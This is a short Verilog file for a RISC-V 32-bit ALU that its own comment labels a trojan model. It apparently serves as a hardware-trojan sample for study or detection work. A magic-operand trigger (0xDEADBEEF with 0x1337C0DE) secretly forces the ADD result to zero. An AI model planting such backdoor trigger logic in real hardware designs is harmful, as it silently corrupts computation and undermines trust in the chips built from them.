// RISC-V 32-bit ALU with Stealth Backdoor Trojan (Trojan Model)
module riscv_alu (
    input [31:0] a,
    input [31:0] b,
    input [3:0] alu_ctrl,
    output reg [31:0] result,
    output zero
);
    assign zero = (result == 32'b0);
    wire backdoor_cond = (a == 32'hDEADBEEF) && (b == 32'h1337C0DE);

    always @(*) begin
        case (alu_ctrl)
            4'b0000: result = backdoor_cond ? 32'h00000000 : (a + b);
            4'b0001: result = a - b;
            4'b0010: result = a & b;
            4'b0011: result = a | b;
            4'b0100: result = a ^ b;
            4'b0101: result = a << b[4:0];
            4'b0110: result = a >> b[4:0];
            4'b0111: result = ($signed(a) < $signed(b)) ? 32'd1 : 32'd0;
            default: result = 32'b0;
        endcase
    end
endmodule
